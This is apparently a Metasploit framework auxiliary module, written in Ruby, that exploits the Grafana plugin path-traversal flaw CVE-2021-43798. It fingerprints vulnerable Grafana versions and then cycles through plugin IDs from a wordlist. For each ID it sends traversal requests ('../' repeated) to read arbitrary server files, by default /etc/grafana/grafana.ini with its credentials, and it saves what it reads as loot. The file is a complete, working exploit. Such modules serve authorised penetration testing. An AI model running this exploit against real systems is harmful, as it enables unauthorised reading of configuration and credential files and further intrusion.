##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Grafana Plugin Path Traversal',
        'Description' => %q{
          Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 8.2.7, or 8.3.1 are vulnerable to directory traversal
          through the plugin URL.  A valid plugin ID is required, but many are installed by default.
        },
        'Author' => [
          'h00die', # msf module
          'jordyv' # discovery
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'References' => [
          ['CVE', '2021-43798'],
          ['URL', 'https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p'],
          ['URL', 'https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/'],
          ['EDB', '50581'],
          ['URL', 'https://github.com/jas502n/Grafana-CVE-2021-43798'],
          ['URL', 'https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce']

        ]
      )
    )
    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('TARGETURI', [ true, 'Path to Grafana instance', '/']),
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/grafana/grafana.ini']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 13]),
        OptPath.new('PLUGINS_FILE', [
          true, 'File containing plugins to enumerate',
          File.join(Msf::Config.data_directory, 'wordlists', 'grafana_plugins.txt')
        ]),
      ]
    )
  end

  def print_progress(host, current, total)
    print_status("#{host} - Progress #{current.to_s.rjust(Math.log10(total).ceil + 1)}/#{total} (#{((current.to_f / total) * 100).truncate(2)}%)")
  end

  def check
    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    return Exploit::CheckCode::Unknown unless res && res.code == 200

    # We need to take into account beta versions, which end with -beta<digit>. See: https://grafana.com/docs/grafana/latest/release-notes/
    # Also take into account preview versions, which end with -preview. See https://grafana.com/grafana/download/10.0.0-preview?edition=oss for more info.
    /"subTitle":"Grafana v(?<full_version>\d{1,2}\.\d{1,2}\.\d{1,2}(?:(?:-beta\d)?|(?:-preview)?)) \([0-9a-f]{10}\)",/ =~ res.body
    return Exploit::CheckCode::Safe unless full_version

    # However, since 8.3.1 does not have a beta, we can safely ignore the -beta suffix when comparing versions
    # In fact, this is necessary because Rex::Version doesn't correctly handle versions ending with -beta when comparing
    if /-beta\d$/ =~ full_version
      version = Rex::Version.new(full_version[0..-7])
    elsif /-preview$/ =~ full_version
      version = Rex::Version.new(full_version[0..-9])
    else
      version = Rex::Version.new(full_version)
    end

    if version.between?(Rex::Version.new('8.0.0-beta1'), Rex::Version.new('8.0.7')) ||
       version.between?(Rex::Version.new('8.1.0'), Rex::Version.new('8.1.8')) ||
       version.between?(Rex::Version.new('8.2.0'), Rex::Version.new('8.2.7')) ||
       version.between?(Rex::Version.new('8.3.0'), Rex::Version.new('8.3.1'))
      print_good("Detected vulnerable Grafana: #{full_version}")
      return Exploit::CheckCode::Appears
    end
    print_bad("Detected non-vulnerable Grafana: #{full_version}")
    return Exploit::CheckCode::Safe
  end

  def run_host(ip)
    check_code = check
    return unless check_code == Exploit::CheckCode::Appears

    f = File.open(datastore['PLUGINS_FILE'], 'rb')
    total = f.readlines.count
    f.rewind
    f = f.readlines
    f.each_with_index do |plugin, i|
      plugin = plugin.strip
      print_progress(target_host, i, total)
      vprint_status("Attempting plugin: #{plugin}")
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'public', 'plugins', plugin, '../' * datastore['DEPTH'], datastore['FILEPATH'])
      })
      next unless res && res.code == 200

      print_good("#{plugin} was found and exploited successfully")
      vprint_good(res.body)
      path = store_loot(
        'grafana.loot',
        'application/octet-stream',
        ip,
        res.body,
        File.basename(datastore['FILEPATH'])
      )
      print_good("#{rhost}:#{rport} - File saved in: #{path}")
      break
    end
  end

end
